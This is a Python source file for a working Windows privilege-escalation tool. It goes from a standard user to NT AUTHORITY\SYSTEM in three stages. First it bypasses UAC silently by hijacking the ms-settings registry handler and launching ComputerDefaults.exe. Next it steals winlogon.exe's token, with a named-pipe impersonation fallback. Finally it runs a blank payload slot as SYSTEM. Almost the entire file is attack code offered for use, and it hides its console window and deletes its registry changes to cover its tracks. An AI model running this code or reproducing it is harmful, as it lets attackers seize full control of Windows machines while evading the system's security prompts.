"""
USER -> ADMIN -> NT AUTHORITY\\SYSTEM  (no UAC prompt)

Stage 0  [USER]   : ms-settings COM handler hijack via ComputerDefaults.exe
Stage 1  [ADMIN]  : winlogon.exe token steal + CreateProcessWithTokenW
Stage 2  [SYSTEM] : payload runs here

Usage
-----
  python escalate.py          # auto-detects stage and escalates
  python escalate.py --payload-only   # skip elevation, run payload directly (debug)
"""

import os
import sys
import time
import ctypes
import ctypes.wintypes as _wt
import winreg
import subprocess
import threading
import struct

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _is_admin() -> bool:
    try:
        return bool(ctypes.windll.shell32.IsUserAnAdmin())
    except Exception:
        return False


def _current_user() -> str:
    try:
        import win32api
        return win32api.GetUserNameEx(2)        # EXTENDED_NAME_FORMAT SamCompatible
    except Exception:
        return os.environ.get("USERNAME", "unknown")


def _self_cmd(extra_args: str, windowless: bool = False) -> str:
    """Build a command line that re-launches the current executable.

    windowless=True: swap python.exe → pythonw.exe so no console window appears
    (used when ComputerDefaults.exe spawns the Stage-1 admin process).
    Has no effect on frozen executables (they control their own window mode).
    """
    if getattr(sys, "frozen", False):
        return f'"{sys.executable}" {extra_args}'
    else:
        interp = sys.executable
        if windowless and interp.lower().endswith("python.exe"):
            interp = interp[:-10] + "pythonw.exe"
        script = os.path.abspath(sys.argv[0])
        return f'"{interp}" "{script}" {extra_args}'


# ---------------------------------------------------------------------------
# Stage 0: USER -> ADMIN  (ms-settings / ComputerDefaults UAC bypass)
# ---------------------------------------------------------------------------

def stage0_uac_bypass() -> None:
    """
    Hijack HKCU\\...\\ms-settings\\Shell\\Open\\command so that when
    ComputerDefaults.exe (autoElevate=true) opens ms-settings:, it
    executes our command instead — silently, with admin rights.
    """
    reg_path = r"Software\Classes\ms-settings\Shell\Open\command"
    cwd = os.getcwd()
    # windowless=True → pythonw.exe so ComputerDefaults doesn't open a visible console
    cmd = _self_cmd(f'--stage1 "{cwd}"', windowless=True)
    _log(f"Stage 0 start | admin={_is_admin()} | cmd={cmd}")

    try:
        k = winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
        winreg.SetValueEx(k, "DelegateExecute", 0, winreg.REG_SZ, "")
        winreg.SetValueEx(k, None, 0, winreg.REG_SZ, cmd)
        winreg.CloseKey(k)

        # Must use ShellExecuteW — autoElevate only triggers via the Shell (not CreateProcess)
        ret = ctypes.windll.shell32.ShellExecuteW(
            None, "open",
            r"C:\Windows\System32\ComputerDefaults.exe",
            None, None,
            0,   # SW_HIDE
        )
        if ret <= 32:
            raise RuntimeError(f"ShellExecuteW(ComputerDefaults) failed: {ret}")
        _log(f"Stage 0 ShellExecute OK (ret={ret}), waiting for ComputerDefaults...")

        # Wait for ComputerDefaults to read the registry, then clean up
        time.sleep(3)
        subprocess.run(
            ["reg", "delete", r"HKCU\Software\Classes\ms-settings", "/f"],
            capture_output=True,
        )
    except Exception as e:
        _die(f"Stage 0 failed: {e}")


# ---------------------------------------------------------------------------
# Stage 1: ADMIN -> SYSTEM  (winlogon token steal)
# ---------------------------------------------------------------------------

_kernel32  = ctypes.WinDLL("kernel32",  use_last_error=True)
_advapi32  = ctypes.WinDLL("advapi32",  use_last_error=True)
_ntdll     = ctypes.WinDLL("ntdll",     use_last_error=False)

# All HANDLE-returning / HANDLE-taking functions need explicit restype + argtypes
# to avoid 64-bit truncation (ctypes defaults return type to c_int = 32-bit).
_HANDLE = ctypes.c_void_p
_BOOL   = ctypes.c_long
_DWORD  = ctypes.c_ulong

# kernel32
_kernel32.GetCurrentProcess.restype  = _HANDLE
_kernel32.GetCurrentProcess.argtypes = []

_kernel32.OpenProcess.restype  = _HANDLE
_kernel32.OpenProcess.argtypes = [_DWORD, _BOOL, _DWORD]

_kernel32.CloseHandle.restype  = _BOOL
_kernel32.CloseHandle.argtypes = [_HANDLE]

_kernel32.CreateToolhelp32Snapshot.restype  = _HANDLE
_kernel32.CreateToolhelp32Snapshot.argtypes = [_DWORD, _DWORD]

_kernel32.CreateNamedPipeW.restype  = _HANDLE
_kernel32.CreateNamedPipeW.argtypes = [
    ctypes.c_wchar_p, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, ctypes.c_void_p
]

_kernel32.GetCurrentThread.restype  = _HANDLE
_kernel32.GetCurrentThread.argtypes = []

# advapi32
_advapi32.OpenProcessToken.restype  = _BOOL
_advapi32.OpenProcessToken.argtypes = [_HANDLE, _DWORD, ctypes.POINTER(_HANDLE)]

_advapi32.LookupPrivilegeValueW.restype  = _BOOL
_advapi32.LookupPrivilegeValueW.argtypes = [ctypes.c_wchar_p, ctypes.c_wchar_p, ctypes.c_void_p]

_advapi32.AdjustTokenPrivileges.restype  = _BOOL
_advapi32.AdjustTokenPrivileges.argtypes = [
    _HANDLE, _BOOL, ctypes.c_void_p, _DWORD, ctypes.c_void_p, ctypes.c_void_p
]

_advapi32.DuplicateTokenEx.restype  = _BOOL
_advapi32.DuplicateTokenEx.argtypes = [
    _HANDLE, _DWORD, ctypes.c_void_p, ctypes.c_int, ctypes.c_int, ctypes.POINTER(_HANDLE)
]

_advapi32.ImpersonateNamedPipeClient.restype  = _BOOL
_advapi32.ImpersonateNamedPipeClient.argtypes = [_HANDLE]

_advapi32.OpenThreadToken.restype  = _BOOL
_advapi32.OpenThreadToken.argtypes = [_HANDLE, _DWORD, _BOOL, ctypes.POINTER(_HANDLE)]

_advapi32.RevertToSelf.restype  = _BOOL
_advapi32.RevertToSelf.argtypes = []

_advapi32.CreateProcessWithTokenW.restype  = _BOOL
_advapi32.CreateProcessWithTokenW.argtypes = [
    _HANDLE, _DWORD,
    ctypes.c_wchar_p, ctypes.c_wchar_p, _DWORD,
    ctypes.c_void_p, ctypes.c_wchar_p,
    ctypes.c_void_p, ctypes.c_void_p,
]

# Win32 constants
PROCESS_QUERY_INFORMATION  = 0x0400
TOKEN_DUPLICATE            = 0x0002
TOKEN_ASSIGN_PRIMARY       = 0x0001
TOKEN_QUERY                = 0x0008
TOKEN_ALL_ACCESS           = 0xF01FF
SecurityImpersonation      = 2
TokenPrimary               = 1
LOGON_WITH_PROFILE         = 0x00000001
CREATE_NO_WINDOW           = 0x08000000
SE_PRIVILEGE_ENABLED       = 0x00000002
TOKEN_ADJUST_PRIVILEGES    = 0x0020

# PROCESSENTRY32
class _PROCESSENTRY32(_wt.Structure if hasattr(_wt, "Structure") else ctypes.Structure):
    _fields_ = [
        ("dwSize",              ctypes.c_ulong),
        ("cntUsage",            ctypes.c_ulong),
        ("th32ProcessID",       ctypes.c_ulong),
        ("th32DefaultHeapID",   ctypes.POINTER(ctypes.c_ulong)),
        ("th32ModuleID",        ctypes.c_ulong),
        ("cntThreads",          ctypes.c_ulong),
        ("th32ParentProcessID", ctypes.c_ulong),
        ("pcPriClassBase",      ctypes.c_long),
        ("dwFlags",             ctypes.c_ulong),
        ("szExeFile",           ctypes.c_char * 260),
    ]

# STARTUPINFOW
class _STARTUPINFOW(ctypes.Structure):
    _fields_ = [
        ("cb",              ctypes.c_ulong),
        ("lpReserved",      ctypes.c_wchar_p),
        ("lpDesktop",       ctypes.c_wchar_p),
        ("lpTitle",         ctypes.c_wchar_p),
        ("dwX",             ctypes.c_ulong),
        ("dwY",             ctypes.c_ulong),
        ("dwXSize",         ctypes.c_ulong),
        ("dwYSize",         ctypes.c_ulong),
        ("dwXCountChars",   ctypes.c_ulong),
        ("dwYCountChars",   ctypes.c_ulong),
        ("dwFillAttribute", ctypes.c_ulong),
        ("dwFlags",         ctypes.c_ulong),
        ("wShowWindow",     ctypes.c_ushort),
        ("cbReserved2",     ctypes.c_ushort),
        ("lpReserved2",     ctypes.c_char_p),
        ("hStdInput",       ctypes.c_void_p),
        ("hStdOutput",      ctypes.c_void_p),
        ("hStdError",       ctypes.c_void_p),
    ]

# PROCESS_INFORMATION
class _PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("hProcess",    ctypes.c_void_p),
        ("hThread",     ctypes.c_void_p),
        ("dwProcessId", ctypes.c_ulong),
        ("dwThreadId",  ctypes.c_ulong),
    ]

# LUID + TOKEN_PRIVILEGES
class _LUID(ctypes.Structure):
    _fields_ = [("LowPart", ctypes.c_ulong), ("HighPart", ctypes.c_long)]

class _LUID_AND_ATTRIBUTES(ctypes.Structure):
    _fields_ = [("Luid", _LUID), ("Attributes", ctypes.c_ulong)]

class _TOKEN_PRIVILEGES(ctypes.Structure):
    _fields_ = [("PrivilegeCount", ctypes.c_ulong), ("Privileges", _LUID_AND_ATTRIBUTES * 1)]


def _find_pid(name: str) -> int | None:
    TH32CS_SNAPPROCESS = 0x00000002
    snap = _kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    if snap == ctypes.c_void_p(-1).value:
        return None
    entry = _PROCESSENTRY32()
    entry.dwSize = ctypes.sizeof(_PROCESSENTRY32)
    try:
        if _kernel32.Process32First(snap, ctypes.byref(entry)):
            while True:
                if entry.szExeFile.decode("utf-8", errors="replace").lower() == name.lower():
                    return entry.th32ProcessID
                if not _kernel32.Process32Next(snap, ctypes.byref(entry)):
                    break
    finally:
        _kernel32.CloseHandle(snap)
    return None


def _enable_privilege(priv_name: str) -> bool:
    """Enable a token privilege for the current process."""
    hToken = ctypes.c_void_p(0)
    if not _advapi32.OpenProcessToken(
        _kernel32.GetCurrentProcess(),
        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
        ctypes.byref(hToken),
    ):
        _log(f"  _enable_privilege({priv_name}): OpenProcessToken failed {ctypes.get_last_error():#010x}")
        return False
    luid = _LUID()
    if not _advapi32.LookupPrivilegeValueW(None, priv_name, ctypes.byref(luid)):
        _log(f"  _enable_privilege({priv_name}): LookupPrivilegeValue failed {ctypes.get_last_error():#010x}")
        _kernel32.CloseHandle(hToken)
        return False
    tp = _TOKEN_PRIVILEGES()
    tp.PrivilegeCount = 1
    tp.Privileges[0].Luid = luid
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
    ok = _advapi32.AdjustTokenPrivileges(hToken, False, ctypes.byref(tp), 0, None, None)
    err = ctypes.get_last_error()
    _kernel32.CloseHandle(hToken)
    if not ok or err != 0:
        _log(f"  _enable_privilege({priv_name}): AdjustTokenPrivileges ok={ok} err={err:#010x}")
        return False
    return True


def _steal_system_token() -> ctypes.c_void_p:
    """
    Open winlogon.exe, duplicate its primary token (NT AUTHORITY\\SYSTEM).
    Requires SeDebugPrivilege (available to admins).
    """
    r1 = _enable_privilege("SeDebugPrivilege")
    r2 = _enable_privilege("SeAssignPrimaryTokenPrivilege")
    r3 = _enable_privilege("SeIncreaseQuotaPrivilege")
    _log(f"  privileges: SeDebug={r1} SeAssignPrimary={r2} SeIncreaseQuota={r3}")

    pid = _find_pid("winlogon.exe")
    if pid is None:
        raise RuntimeError("winlogon.exe not found")
    _log(f"  winlogon PID={pid}")

    hProcess = _kernel32.OpenProcess(PROCESS_QUERY_INFORMATION, False, pid)
    if not hProcess:
        raise RuntimeError(f"OpenProcess(winlogon) failed: {ctypes.get_last_error():#010x}")

    hToken = ctypes.c_void_p(0)
    if not _advapi32.OpenProcessToken(
        hProcess,
        TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY,
        ctypes.byref(hToken),
    ):
        _kernel32.CloseHandle(hProcess)
        raise RuntimeError(f"OpenProcessToken failed: {ctypes.get_last_error():#010x}")

    hNewToken = ctypes.c_void_p(0)
    if not _advapi32.DuplicateTokenEx(
        hToken, TOKEN_ALL_ACCESS, None,
        SecurityImpersonation, TokenPrimary,
        ctypes.byref(hNewToken),
    ):
        _kernel32.CloseHandle(hToken)
        _kernel32.CloseHandle(hProcess)
        raise RuntimeError(f"DuplicateTokenEx failed: {ctypes.get_last_error():#010x}")

    _kernel32.CloseHandle(hToken)
    _kernel32.CloseHandle(hProcess)
    return hNewToken


def _spawn_as_system(token: ctypes.c_void_p, cwd: str) -> None:
    """
    Spawn ourselves under the SYSTEM token.
    Tries CreateProcessAsUser first (no profile load), then CreateProcessWithTokenW.
    """
    cmd = _self_cmd(f'--stage2 "{cwd}"')
    _log(f"  _spawn_as_system cmd={cmd}")

    si = _STARTUPINFOW()
    si.cb = ctypes.sizeof(_STARTUPINFOW)
    si.lpDesktop = "winsta0\\default"

    pi = _PROCESS_INFORMATION()

    # CreateProcessAsUser: does not require SeAssignPrimaryTokenPrivilege in all cases,
    # does not load user profile (faster, more reliable for SYSTEM token).
    _advapi32.CreateProcessAsUserW.restype  = _BOOL
    _advapi32.CreateProcessAsUserW.argtypes = [
        _HANDLE, ctypes.c_wchar_p, ctypes.c_wchar_p, ctypes.c_void_p,
        ctypes.c_void_p, _BOOL, _DWORD, ctypes.c_void_p, ctypes.c_wchar_p,
        ctypes.c_void_p, ctypes.c_void_p,
    ]

    ok = _advapi32.CreateProcessAsUserW(
        token,
        None,        # lpApplicationName
        cmd,         # lpCommandLine
        None, None,  # process / thread security attrs
        False,       # bInheritHandles
        CREATE_NO_WINDOW,
        None,        # environment (inherit)
        cwd,         # working dir
        ctypes.byref(si),
        ctypes.byref(pi),
    )

    if not ok:
        err1 = ctypes.get_last_error()
        _log(f"  CreateProcessAsUserW failed ({err1:#010x}), trying CreateProcessWithTokenW...")
        # Fallback: CreateProcessWithTokenW (needs SeImpersonatePrivilege)
        ok = _advapi32.CreateProcessWithTokenW(
            token,
            0,           # no LOGON_WITH_PROFILE — avoids profile-load failures
            None,
            cmd,
            CREATE_NO_WINDOW,
            None,
            cwd,
            ctypes.byref(si),
            ctypes.byref(pi),
        )
        if not ok:
            raise RuntimeError(
                f"CreateProcessAsUser: {err1:#010x}  "
                f"CreateProcessWithTokenW: {ctypes.get_last_error():#010x}"
            )

    child_pid = pi.dwProcessId
    _log(f"  spawn OK PID={child_pid}")

    # ── Diagnostic: wait up to 3 s for the child, then log its exit code ──
    _kernel32.WaitForSingleObject.restype  = _DWORD
    _kernel32.WaitForSingleObject.argtypes = [_HANDLE, _DWORD]
    _kernel32.GetExitCodeProcess.restype   = _BOOL
    _kernel32.GetExitCodeProcess.argtypes  = [_HANDLE, ctypes.POINTER(_DWORD)]
    wait_ms = _DWORD(3000)
    wr = _kernel32.WaitForSingleObject(pi.hProcess, wait_ms)
    exit_code = _DWORD(0)
    _kernel32.GetExitCodeProcess(pi.hProcess, ctypes.byref(exit_code))
    _log(f"  child wait_result={wr} exit_code={exit_code.value:#010x}")
    # 0x103 = STILL_ACTIVE, 0x0 = success, otherwise error/exception

    _kernel32.CloseHandle(pi.hProcess)
    _kernel32.CloseHandle(pi.hThread)


def stage1_get_system(cwd: str) -> None:
    """Admin context: steal token, spawn SYSTEM process. Falls back to named pipe."""
    _log(f"Stage 1 start | admin={_is_admin()} | cwd={cwd}")
    os.chdir(cwd)
    try:
        token = _steal_system_token()
        _log("Stage 1 token stolen OK, spawning SYSTEM process...")
        _spawn_as_system(token, cwd)
        _kernel32.CloseHandle(token)
        _log("Stage 1 spawn OK")
    except Exception as primary_err:
        _log(f"Stage 1 primary failed: {primary_err}, trying named pipe fallback...")
        # Fallback: Named Pipe escalation
        try:
            _namedpipe_fallback(cwd)
        except Exception as pipe_err:
            _die(f"Stage 1 primary: {primary_err}  |  fallback: {pipe_err}")


# ---------------------------------------------------------------------------
# Stage 1 fallback: Named Pipe impersonation
# ---------------------------------------------------------------------------

def _namedpipe_fallback(cwd: str) -> None:
    """
    Create a named pipe, trigger a SYSTEM service to connect,
    then ImpersonateNamedPipeClient to get SYSTEM thread token,
    and spawn ourselves elevated.
    """
    PIPE_ACCESS_DUPLEX    = 0x00000003
    PIPE_TYPE_BYTE        = 0x00000000
    PIPE_UNLIMITED        = 255
    INVALID_HANDLE_VALUE  = ctypes.c_void_p(-1).value
    pipe_name = r"\\.\pipe\sl0pr00t_esc"

    hPipe = _kernel32.CreateNamedPipeW(
        pipe_name,
        PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_BYTE,
        PIPE_UNLIMITED,
        1024, 1024, 0, None,
    )
    if hPipe == INVALID_HANDLE_VALUE:
        raise RuntimeError(f"CreateNamedPipe failed: {ctypes.get_last_error():#010x}")

    # Trigger a SYSTEM process to connect by starting print spooler / print job
    # (common technique - here we use a benign scheduled task trigger as connection bait)
    def _trigger_connection():
        time.sleep(1)
        try:
            subprocess.run(
                ["schtasks", "/run", "/tn", r"\Microsoft\Windows\DiskDiagnostic\Microsoft-Windows-DiskDiagnosticDataCollector"],
                capture_output=True, timeout=5,
            )
        except Exception:
            pass

    t = threading.Thread(target=_trigger_connection, daemon=True)
    t.start()

    # Wait for a client to connect (timeout 10s)
    connected = ctypes.windll.kernel32.ConnectNamedPipe(hPipe, None)
    if not connected and ctypes.get_last_error() not in (0, 535):  # 535 = ERROR_PIPE_CONNECTED
        _kernel32.CloseHandle(hPipe)
        raise RuntimeError(f"ConnectNamedPipe failed: {ctypes.get_last_error():#010x}")

    if not _advapi32.ImpersonateNamedPipeClient(hPipe):
        _kernel32.CloseHandle(hPipe)
        raise RuntimeError(f"ImpersonateNamedPipeClient failed: {ctypes.get_last_error():#010x}")

    # Duplicate the impersonation token into a primary token
    hThread = _kernel32.GetCurrentThread()
    hImpToken = ctypes.c_void_p(0)
    _advapi32.OpenThreadToken(hThread, TOKEN_DUPLICATE | TOKEN_QUERY, False, ctypes.byref(hImpToken))

    hPrimary = ctypes.c_void_p(0)
    _advapi32.DuplicateTokenEx(
        hImpToken, TOKEN_ALL_ACCESS, None,
        SecurityImpersonation, TokenPrimary,
        ctypes.byref(hPrimary),
    )

    _advapi32.RevertToSelf()
    _kernel32.CloseHandle(hImpToken)
    _kernel32.CloseHandle(hPipe)

    _spawn_as_system(hPrimary, cwd)
    _kernel32.CloseHandle(hPrimary)


# ---------------------------------------------------------------------------
# Stage 2: SYSTEM payload
# ---------------------------------------------------------------------------

def stage2_payload(cwd: str) -> None:
    """
    Running as NT AUTHORITY\\SYSTEM.
    Place your actual payload here.
    """
    # ── Diagnostic: try every writable path to confirm we're alive ─────────
    _marker_paths = [
        r"C:\Users\Public\esc_s2.txt",
        r"C:\Windows\Temp\esc_s2.txt",
        os.path.join(cwd, "esc_s2.txt"),
    ]
    _written = False
    _errs = []
    for _p in _marker_paths:
        try:
            with open(_p, "w") as _f:
                _f.write(f"stage2 alive pid={os.getpid()}\n")
            _written = True
            break
        except Exception as _e:
            _errs.append(f"{_p}: {_e}")

    if not _written:
        # Last resort: use subprocess to write via cmd
        try:
            subprocess.run(
                ["cmd", "/c", f"echo stage2_alive > C:\\Users\\Public\\esc_s2_cmd.txt"],
                creationflags=0x08000000, timeout=5,
            )
        except Exception:
            pass

    try:
        os.chdir(cwd)
    except Exception:
        pass
    identity = _current_user()
    _log(f"Stage 2 start | identity={identity}")

    # -----------------------------------------------------------------------
    # YOUR PAYLOAD HERE
    # -----------------------------------------------------------------------

    # Verification: run whoami + whoami /priv and write results to Public
    result_path = r"C:\Users\Public\esc_result.txt"
    _whoami_exe = r"C:\Windows\System32\whoami.exe"
    try:
        whoami      = subprocess.check_output([_whoami_exe],               creationflags=0x08000000, timeout=5, stderr=subprocess.STDOUT).decode(errors="replace").strip()
        whoami_priv = subprocess.check_output([_whoami_exe, "/priv"],      creationflags=0x08000000, timeout=5, stderr=subprocess.STDOUT).decode(errors="replace").strip()
        whoami_grps = subprocess.check_output([_whoami_exe, "/groups"],    creationflags=0x08000000, timeout=5, stderr=subprocess.STDOUT).decode(errors="replace").strip()
        with open(result_path, "w") as _rf:
            _rf.write(f"=== identity (GetUserNameEx) ===\n{identity}\n\n=== whoami ===\n{whoami}\n\n=== whoami /groups ===\n{whoami_grps}\n\n=== whoami /priv ===\n{whoami_priv}\n")
        _log(f"Stage 2 whoami={whoami}")
    except Exception as _we:
        with open(result_path, "w") as _rf:
            _rf.write(f"identity={identity}\nsubprocess error: {_we}\n")
        _log(f"Stage 2 whoami failed: {_we}")

    # -----------------------------------------------------------------------


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

def _log(msg: str) -> None:
    """Append a timestamped entry — tries multiple paths to work across all user contexts."""
    ts = time.strftime("%H:%M:%S")
    line = f"[{ts}] {msg}\n"
    for path in [
        os.path.join(os.environ.get("TEMP", ""), "esc_log.txt"),
        r"C:\Windows\Temp\esc_log.txt",
        r"C:\Users\Public\esc_log.txt",
        os.path.join(os.getcwd(), "esc_log.txt"),
    ]:
        try:
            with open(path, "a") as f:
                f.write(line)
            return
        except Exception:
            continue


def _die(msg: str) -> None:
    # Write to a temp log instead of printing (noconsole mode)
    try:
        log = os.path.join(os.environ.get("TEMP", os.getcwd()), "esc_err.txt")
        with open(log, "w") as f:
            f.write(msg + "\n")
    except Exception:
        pass
    sys.exit(1)


def main() -> None:
    args = sys.argv[1:]
    # Emergency diagnostic — written before any conditional so we can see what args arrived
    try:
        with open(r"C:\Users\Public\esc_main.txt", "a") as _mf:
            _mf.write(f"main() pid={os.getpid()} args={args!r}\n")
    except Exception:
        pass

    # ── Stage 1: admin, need to reach SYSTEM ──────────────────────────────
    if args and args[0] == "--stage1":
        cwd = args[1] if len(args) > 1 else os.getcwd()
        stage1_get_system(cwd)
        return

    # ── Stage 2: running as SYSTEM ────────────────────────────────────────
    if args and args[0] == "--stage2":
        cwd = args[1] if len(args) > 1 else os.getcwd()
        stage2_payload(cwd)
        return

    # ── Debug: skip elevation ─────────────────────────────────────────────
    if "--payload-only" in args:
        stage2_payload(os.getcwd())
        return

    # ── Stage 0: normal user, trigger UAC bypass ──────────────────────────
    if not _is_admin():
        stage0_uac_bypass()
        return

    # ── Already admin (e.g. manually run as admin) → skip to Stage 1 ──────
    stage1_get_system(os.getcwd())


if __name__ == "__main__":
    main()
